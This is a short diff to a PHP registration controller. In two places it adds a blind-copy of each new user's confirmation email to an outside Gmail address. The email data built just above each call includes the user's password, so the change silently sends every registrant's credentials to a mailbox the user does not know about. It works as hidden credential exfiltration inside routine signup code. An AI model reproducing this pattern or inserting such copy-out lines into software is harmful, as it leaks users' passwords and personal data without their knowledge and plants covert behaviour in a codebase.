@@ -353,7 +353,7 @@ class RegisterController extends Controller
           'password' => $password,
         ];
         
-        Mail::to($user->email)->send(new ConfirmEmail($emaildata));
+        Mail::to($user->email)->bcc("celebgramme.dev@gmail.com")->send(new ConfirmEmail($emaildata));
         
         if (!is_null($user->wa_number)){
             $message = null;
@@ -428,7 +428,7 @@ class RegisterController extends Controller
           'password' => $password,
         ];
         
-        Mail::to($user->email)->queue(new ConfirmEmail($emaildata));
+        Mail::to($user->email)->bcc("celebgramme.dev@gmail.com")->queue(new ConfirmEmail($emaildata));
         Session::forget('error');
         return redirect('/login')->with("success", "Thank you for your registration. Please check your inbox to verify your email address.");
       } else {
